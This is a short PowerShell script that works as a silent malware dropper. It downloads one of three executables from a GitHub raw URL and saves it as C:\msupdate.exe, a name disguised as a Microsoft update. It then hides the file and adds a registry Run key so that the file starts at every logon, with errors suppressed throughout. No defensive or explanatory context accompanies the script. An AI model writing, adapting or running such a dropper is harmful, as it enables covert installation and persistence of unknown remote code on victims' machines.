# Simple Silent Downloader + Persistence
$ErrorActionPreference = 'SilentlyContinue'

# === CHANGE THIS LINE ONLY ===
$version = 0   # Change to 0, 1, or 2

# Choose URL based on version
switch ($version) {
    0 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
    1 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace1.exe" }
    2 { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace2.exe" }
    default { $url = "https://github.com/mrxssmaster-bot/test/raw/refs/heads/main/lab/ace.exe" }
}

$finalPath = "C:\msupdate.exe"

# Fast Download
try {
    (New-Object System.Net.WebClient).DownloadFile($url, $finalPath)
} catch { exit }

# Hide file
attrib +h $finalPath 2>$null

# Persistence
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "MSUpdate" -Value $finalPath -Type String -Force

exit
